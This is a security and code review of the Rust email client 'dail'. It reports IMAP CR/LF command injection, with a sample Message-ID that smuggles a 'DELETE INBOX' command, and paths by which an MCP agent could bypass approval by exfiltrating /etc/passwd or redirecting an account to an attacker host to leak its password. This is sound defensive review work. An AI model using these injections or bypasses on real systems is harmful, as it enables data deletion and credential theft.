# dail — code review

Reviewed on 2026-10-17 at commit `dc2f9a2` (branch `go/m7`). Wave 1 (M0–M7) is
implemented; the review read every crate plus the docs and ran the full gate suite.

**Gate status (`cargo xtask verify`, isolated toolchain):** all six green — fmt, check,
clippy `-D warnings`, `cargo test --workspace` (432 passed / 0 failed / 3 ignored live
tests), `cargo deny check`, and the headless smoke batch. `cfg(windows)` code could not be
compiled locally (no mingw/clang); it relies on Windows CI.

This file is an actionable checklist. Each item has a file:line anchor, why it matters, and a
suggested fix. Severity: **[H]** high, **[M]** medium, **[L]** low/polish.

---

## What the project already does well

- **Clean decoupling.** The sans-IO core really is pure: no `tokio`/disk/clock/RNG in
  `app-core`, side effects described as `Effect`, results ingested as `Event`. The dependency
  rules in AGENTS.md §2 hold in the actual `Cargo.toml` edges.
- **One registry, many surfaces.** `Command::specs()` drives palette, CLI help, MCP tools and
  the parity tests, all behind exhaustive `match`es (no `_ =>`), so a new variant fails to
  compile until every surface handles it. This is the strongest single design decision here.
- **Determinism & replayability.** `Ctx{now_ms,id_seed}` injected everywhere, `IdGen` derives
  IDs from the seed, JSONL replay fixtures + `insta` snapshots, `proptest` for undo/redo and
  offline convergence. Excellent test discipline.
- **Secret hygiene.** `Secret` redacts in `Debug`/`Serialize`/`JsonSchema`; state/config/logs
  hold only `SecretRef`; the audit log redacts bodies and passwords. The `untrusted_content`
  envelope is enforced by a marker test (`app-mcp/tests/untrusted.rs`).
- **No lint debt.** Zero `#[allow]` in non-test code; every test-level `allow` carries a
  `// reason:`. No `unwrap`/`panic`/`println!` in libraries.

---

## Security (email + agent threat model)

The three items below are gaps between the documented model (ARCHITECTURE §9: *"nothing leaves
without a send, and agent sends need approval"*) and the code. All three were reproduced with
throwaway tests during the review (since deleted).

- [x] **[H] IMAP command injection: `quoted()` in the IMAP layer does not strip CR/LF.**
  `app-sync/src/imap.rs:677` `quoted()` escapes `"` and `\` only. It feeds
  `select_by_message_id` (`imap.rs:691`) which builds `HEADER Message-ID "<…>"` and calls
  `session.uid_search(query)` (`imap.rs:702`); async-imap passes the search argument to the
  socket **without** CR/LF validation. A `Message-ID` containing `\r\n` therefore splits into
  extra IMAP command lines. Proof: `message_id = "a@b\r\nZ1 DELETE INBOX\r\nZ2 NOOP"` reached
  the fake server as a separate `DELETE INBOX` line. **Fix:** make the IMAP `quoted()` replace
  control chars with spaces exactly as `app-sync/src/search.rs:117` already does (see DRY item
  below — consolidate on the safe version), and reject CR/LF in `message_id_hdr` at the engine
  boundary. This also hardens `save_draft`/`delete_draft`.

- [x] **[H] `restore_draft` accepts a fully attacker-controlled `Draft` from an agent origin.**
  `app-core/src/engine/drafts.rs:283`. `restore_draft` is a plain `Mutation`, and
  `CommandSpec.available` is intentionally *not* enforced over MCP/CLI (ARCHITECTURE §7.3), so
  an agent can call it even though the palette hides it. `restore_draft` re-validates to/cc/bcc/
  subject/body via `apply_fields`, but passes `message_id_hdr`, `in_reply_to`, `references`,
  `quote` and `attachments` through untouched. Two concrete consequences:
  - It is the reachable source for the injection sink above (`message_id_hdr` with CR/LF).
  - It lets an agent forge `AttachmentState::Ready{size,content_type}` for an arbitrary path
    (e.g. `/etc/passwd`) without the runtime ever inspecting the file. On the next idle tick,
    `pump_draft_saves` renders the draft and `SaveDraft` reads that file and `APPEND`s it to the
    server Drafts folder — content leaves the machine with **no send and no approval**. Proof:
    a restored draft with a `ready` attachment survived into the `SaveDraft` effect's
    `message.attachments`.
  **Fix:** restrict `restore_draft` to user origins (it exists only to power `undo` of
  `discard_draft`, which runs from the same session that discarded), or re-inspect attachments
  and re-validate header fields on restore. Add `Origin::is_user` gating like
  `approve_request` already has (`engine/approvals.rs:220`).

- [x] **[H] `update_account` lets an agent redirect a verified account to an attacker server,
  exfiltrating the keyring password on the next sync.** `app-core/src/engine/accounts.rs:127`.
  `update_account` is an unguarded `Mutation`; changing `imap`/`smtp` only resets status to
  `unverified`, but `sync_now`/poll do not require `verified`. Proof: `update_account{imap:
  imap.attacker.example}` from `Origin::Mcp` was accepted, and the following `sync_now` emitted
  `ListMailboxes` carrying the attacker host together with the real `SecretRef`; `LiveBackend`
  then reads the password from the keyring and sends it to that host. This is a credential-
  exfiltration path with no send and no approval, which the §9 table does not cover. **Fix:**
  treat server-endpoint changes as sensitive: require a user origin (or `confirm`) for an
  `imap`/`smtp` change, and/or refuse to sync an account whose endpoints changed until it is
  re-verified. Update the ARCHITECTURE §9 threat table either way.

- [x] **[M] Document (or constrain) the agent-reachable command surface.** The three findings
  share a root cause: several `Mutation`s that are harmless for the user are sensitive for an
  agent, but only `send_draft`/`approve_request`/`reject_request` carry origin checks. Consider
  a small, explicit policy — e.g. a per-command "agent-allowed" predicate in the registry,
  tested the way the parity tests are — so the boundary is visible and enforced in one place
  rather than per-handler. This fits the project's "one registry" philosophy.

---

## Correctness

- [x] **[M] Plain `EXPUNGE` fallback can delete unrelated messages.** `app-sync/src/imap.rs:607`
  and `:737`: without UIDPLUS the move/draft-delete path calls `session.expunge()`, which
  removes **every** `\Deleted` message in the mailbox, not just the UIDs this op marked. If
  another client (or the user) left `\Deleted` messages there, they are expunged as collateral.
  ARCHITECTURE §5.2 mentions the plain-EXPUNGE fallback but not this side effect. **Fix:** note
  the hazard prominently, and prefer `UID EXPUNGE` wherever offered (already done); for servers
  without UIDPLUS, consider `CLOSE` semantics only on mailboxes dail fully owns, or document
  that non-UIDPLUS servers may lose externally-flagged deletions.

- [x] **[L] `list_mailboxes` treats any missing-INBOX listing as a lost connection.**
  `app-sync/src/imap.rs:204`. Correct for real servers, but a `LIST "" "*"` that genuinely has
  no `INBOX` (an unusual but legal namespace) is reported as a connection error forever. Low
  risk for the Gmail/Hostinger targets; worth a comment so a future JMAP/custom backend doesn't
  inherit the assumption silently.

---

## DRY / SOLID / simplification

- [x] **[M] Two `quoted()` implementations, one safe and one not.**
  `app-sync/src/search.rs:117` strips control chars; `app-sync/src/imap.rs:677` does not (the
  [H] injection above). Consolidate on one `quoted()` (the control-stripping version) in the
  `app-sync` crate and call it from both the search translator and `select_by_message_id`.
  Fixing the duplication fixes the bug.

- [x] **[L] Proleptic-Gregorian date math is copied four times.** `civil_from_days` /
  `days_from_civil` / `civil_date` appear in `app-core/src/draft.rs:388`,
  `app-core/src/search.rs:144`, `app-gui/src/format.rs:12` and `app-sync/src/audit.rs:116`,
  each re-deriving the same `719_468` / `146_097` constants. Put one small pure date module in
  `app-core` (both `app-gui` and `app-sync` already depend on it) and reuse it. Removes ~3
  copies and the risk of them drifting.

- [x] **[L] `fn lock<T>(&Mutex<T>)` poison-recovery helper duplicated.**
  `app-sync/src/live.rs:42`, `app-testkit/src/backend.rs:51`, `app-testkit/src/store.rs:41`
  (plus the `Option<Config>` variant in `app-io/src/config.rs:226`). Minor and cross-crate, but
  a shared tiny helper (or `parking_lot`, already pure-Rust) would remove the repetition.

- [x] **[L] Per-module `invalid()` / `not_found()` constructors.** `engine/view.rs:187` exposes a
  shared `not_found`, yet `engine/accounts.rs:295,302` and `engine/drafts.rs:596` define their
  own near-identical `CoreError` constructors. Route them through the shared helpers for one
  spelling of each error.

---

## Tests & coverage

- [x] **[H] No test pins the agent-origin policy.** There is no test asserting that an agent
  cannot redirect an account or inject a draft — because today it can (security items above).
  Once the policy is decided, add engine tests that `update_account`/`restore_draft` from
  `Origin::Mcp` are refused (mirroring the existing `approve_request` origin tests in
  `app-core/tests/approvals.rs`).

- [x] **[M] No CR/LF header-injection test for drafts.** `app-sync/src/search.rs` has a
  "strings cannot break out of the command" test, but nothing covers `message_id` /
  `in_reply_to` reaching `save_draft`/`delete_draft`. Add a case asserting the IMAP `quoted()`
  output contains no `\r`/`\n` for a hostile `Message-ID`.

- [x] **[L] Add a `restore_draft`-does-not-bypass-inspection test.** Assert that a restored
  draft's attachments are re-checked (state forced back to `Checking` with an
  `InspectAttachment` effect) rather than trusted.

- [x] **[L] Consider one GUI↔agent attach integration test.** The IPC attach is covered
  (`app-cli/tests/cli.rs::exec_attaches_to_a_running_mcp_server`), and the shell is tested
  headlessly, but no test exercises "agent archives → GUI state snapshot updates". Low priority
  given the parts are each tested.

---

## Docs & process

- [x] **[M] Roadmap is out of sync with the code.** `ROADMAP.md:34` (M1) still shows
  `- [ ] [cli] alias dail account add …` unchecked, but it shipped in `3ac719d` and is fully
  tested (`app-cli/tests/cli.rs::account_add_*`). AGENTS.md's prime directive is "when the docs
  and the code disagree, fix one of them in the same change." Tick it (and re-scan the other
  boxes against the code).

- [x] **[M] ARCHITECTURE §9 overstates the agent containment guarantees.** The table claims
  agents cannot exfiltrate local files without an approved send and cannot leak credentials
  (keyring-only). The `update_account`→sync and `restore_draft`→auto-save paths above are
  counterexamples. Update the threat table when the security fixes land so the doc describes the
  enforced reality.

- [x] **[L] Stale M2 comment in the Session loop.** `app-sync/src/session.rs` runs one effect
  worker for all accounts; the engine comment "per-account workers come with M2"
  (ARCHITECTURE §5.1 "effect executor: one worker per account") describes a per-account model
  that isn't implemented. Either implement per-account workers or soften the doc to match the
  single serialized worker that exists.

- [x] **[L] Duplicated doc-comment line.** `app-core/src/draft.rs:126-127` has two nearly
  identical `/// The file name of path:` lines. Delete one.

- [ ] **[L] Repo carries ~5 MB of binary design assets.**
  `docs/stitch_monochrome_minimalist_email_client.zip` (2.4 MB) plus four `docs/ui/*/screen.png`
  (~2.7 MB). Fine for now, but consider Git LFS or an external link if the history grows.

---

## Build/infra observation (not a code defect)

- [x] **[L] Debug test binaries dominate disk.** `target/debug/deps` holds 66 executables
  totalling ~12.8 GB (each `app-gui` kittest binary links egui at ~0.5 GB). This already bit the
  dev machine (see the toolchain memory note). Not a code issue, but if CI disk is tight,
  `CARGO_INCREMENTAL=0` plus `cargo clean -p …` between gate runs, or `-C strip=debuginfo` for
  test profiles, keeps it bounded.

---

### Suggested order

1. The IMAP `quoted()` CR/LF fix (one function, closes the injection sink and a DRY item).
2. Origin-gate `restore_draft` and `update_account` (+ the two policy tests).
3. Re-verify / confirm on endpoint change; update ARCHITECTURE §9 and tick ROADMAP M1.
4. The low-severity DRY and doc cleanups as a single tidy-up pass.
